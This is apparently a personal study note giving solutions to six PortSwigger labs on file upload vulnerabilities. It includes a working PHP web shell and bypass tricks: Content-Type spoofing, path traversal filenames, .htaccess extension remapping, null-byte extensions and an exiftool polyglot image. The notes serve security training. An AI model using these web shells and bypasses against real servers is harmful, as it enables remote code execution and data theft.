

```toc
```


# File Upload Vulnersbilities


---

```TXT

Main Points for File Upload:

	1. File Extension ( `.pdf, .png, .xlcx`, etc… )
	2. Magic Number ( `25 50 44 46 2D` the Magic number for the PDF file )
	3. MIME Type [ stands for Multipurpose Internet Mail Extensions ] 
	   → ( e.g., `text/html`, `image/jpeg`, `application/pdf` )
	4. Content for the file.
	   
```

---
![[attachments/Pasted image 20251019151033.png]]

# Image


![[Pasted image 20251018044423.png]]

## 1. Lab: Remote code execution via web shell upload

**Instructions:**
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution:**

Once you enter this lab you have the credentials with username : wiener  |  password : peter
and the you have the file upload vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem

![[1.png]]
for this you can try to upload file that content the shell you can create this 

```PHP
<?php 
$output = shell_exec($_GET["cmd"]);
echo "<pre>$output</pre>";
?>
```

![[2.png]]
uploaded Successfully
this small code open the shell on the server and you can write the any command on the server.

![[4.png]]
Now get the path for the image you uploaded 
Follow this with the ?cmd=id to get userId

![[5.png]]

And the Target to get the path of the `/home/carlos/secret` you can make this if this file on your machine with use command `cat /home/carlos/secret`.

![[7.png]]

Congratulations, You got the flag 🎉🎉🎉.

![[8.png]]




----

## 2. Lab: Web shell upload via Content-Type restriction bypass

**Instructions:**
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution:**
Once you enter this lab you have the credentials with username : wiener  |  password : peter
and the you have the file upload but relies on checking user-controllable input to verify this
for this you can try to upload file that content the shell you can create this 

```PHP
<?php 
$output = shell_exec($_GET["cmd"]);
echo "<pre>$output</pre>";
?>
```

![[1.png]]


![[Pasted image 20251017232527.png]]

This not accept because it more secure 😂
it tell you that type application/x-php not accept the file that you uploaded
the type image/png and type image/jpeg accept this 
Now change the type and send the request.

![[Pasted image 20251017234415.png]]
and it uploaded successfully 
Check if the shell work or not by write and command like `cmd=id`
![[Pasted image 20251017234532.png]]

Now the Target to get the path of the `/home/carlos/secret` you can make this if this file on your machine with use command `cat /home/carlos/secret`.

![[Pasted image 20251017234702.png]]

Congratulations, You got the flag🎉🎉🎉.
![[Pasted image 20251017234802.png]]



---


## 3. Lab: Web shell upload via path traversal

**Instructions:**
This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`


**Solution:**
Once you enter this lab you have the credentials with username : wiener  |  password : peter
The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting


![[1.png]]
you can upload the shell.php that have the exploit code 
![[Pasted image 20251017235909.png]]
It uploaded successfully but i have a problem
when i get the path for this shell file it show the content for the image as a text

![[Pasted image 20251017235748.png]]
you can try to use file traversal to solve this problem
you can add the `../` before the name of your upload file and don't forget to decode this with URL encoding to bypass this to get the file name `%2e%2e%2fshell.php`
![[Pasted image 20251018000549.png]]

and the file upload successfully now you want to test the shell script 
![[Pasted image 20251018000815.png]]
Now the Target to get the path of the `/home/carlos/secret` you can make this if this file on your machine with use command `cat /home/carlos/secret`.
![[Pasted image 20251018000928.png]]
Congratulations, You got the flag🎉🎉🎉.
![[Pasted image 20251018001023.png]]




---

## 4. Lab: Web shell upload via extension blacklist bypass

**Instructions:**
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution:**
Once you enter this lab you have the credentials with username : wiener  |  password : peter
Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

![[1.png]]

I tried to upload my shell shell.php put it not allowed to upload this 

![[Pasted image 20251018011008.png]]

you can try another version of php (e.g php5, php7,phtml) and it successfully uploaded put it show it as an Image

![[Pasted image 20251018010910.png]]

you can use another thing called `.htaccess ` to understand this 
you make the Small Game 🎮 you will upload Two files 
First one file name `.htaccess` and the content to allow to any file with `.l33t` 

![[Pasted image 20251018012859.png]]

and The Second file that file name `file.l33t` that content the PHP code inside it

![[Pasted image 20251018012642.png]]

and the file that content the shell code will uploaded successfully

![[Pasted image 20251018012602.png]]

to test the shell script that you have cmd you can test `?cmd=id`

![[Pasted image 20251018012534.png]]

Now the Target to get the path of the `/home/carlos/secret` you can make this if this file on your machine with use command `cat /home/carlos/secret`.

![[Pasted image 20251018012328.png]]

Congratulations, You got the Flag 🎉🎉🎉

![[Pasted image 20251018012416.png]]



----

## 5. Lab: Web shell upload via obfuscated file extension

**Instructions:**
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution:**

Once you enter this lab you have the credentials with username : wiener  |  password : peter
this lab has vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

![[1.png]]
you can upload the file that content the shell in the upload field and this not allowed because it but the block list to be more secure but he can forget anything can not add in this list you can try `shell.php%00.png` and this will uploaded

![[Pasted image 20251018014649.png]]
you can go to the path for the file to test that if it uploaded of not 

![[Pasted image 20251018014219.png]]
noe test with the command `?cmd=id` to see the userId
Good It works
![[Pasted image 20251018014306.png]]
Now the Target to get the path of the `/home/carlos/secret` you can make this if this file on your machine with use command `cat /home/carlos/secret`.
![[Pasted image 20251018014415.png]]
Congratulations, You got the Flag🎉🎉🎉.
![[Pasted image 20251018014509.png]]




---

## 6. Lab: Remote code execution via polyglot web shell upload

**Instructions:**
This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`


**Solution:**

Once you enter this lab you have the credentials with username : wiener  |  password : peter
this lab has vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

![[1.png]]
you can upload the file that content the shell in the upload field and this not allowed because it check the content of the shell script i can use the **polyglot web shell**

The **polyglot web shell** technique works by creating a file that is both a valid image and a functional PHP script. The server accepts it because it validates the file as a legitimate image (based on structure or magic bytes), but when accessed, the PHP interpreter processes embedded code in the image’s metadata

to understand this if you have an image called "Me.jpg" you can use tool called **exifable** to get the information for this image.
![[Pasted image 20251018024350.png]]

this tool has the option that you can add the comment to this image 
`exiftool -Comment="Write anything you like" Me.jpg`

![[Pasted image 20251018024503.png]]

Now show the Information of the image again you can see this comment on the image.

![[Pasted image 20251018024545.png]]

Idea that you can use that you can put the payload on the comment with this tool and the output for this put it file called `polyglot.php`

![[Pasted image 20251018024706.png]]
and upload this file to the server

![[Pasted image 20251018023736.png]]

it will successfully uploaded and show to you the content that you want to show 

![[Pasted image 20251018023718.png]]

Congratulations, You got the Flag🎉🎉🎉.

![[Pasted image 20251018023635.png]]




